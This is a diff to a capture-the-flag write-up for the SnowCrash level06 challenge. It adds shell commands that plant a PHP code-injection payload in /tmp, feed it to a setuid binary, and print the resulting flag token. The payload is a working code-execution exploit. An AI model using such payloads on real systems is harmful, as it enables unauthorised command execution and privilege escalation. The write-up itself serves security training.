@@ -1,2 +1,9 @@
 When getting on the level06 account you can see 2 files : level06 and level06.php
-level06 execute level06.php with the flag06 suid so you need to exploit the code with the exploit you can found in the resource folder
+level06 execute level06.php with the flag06 suid
+so you need to exploit the code with the exploit you can found in the resource folder
+
+level06@SnowCrash:~$ echo '[x ${${exec(`/bin/getflag > /tmp/flag`)}}]' > /tmp/exploit
+level06@SnowCrash:~$ chmod 777 /tmp/exploit
+level06@SnowCrash:~$ ./level06 /tmp/exploit aaaa
+level06@SnowCrash:~$ cat /tmp/flag
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
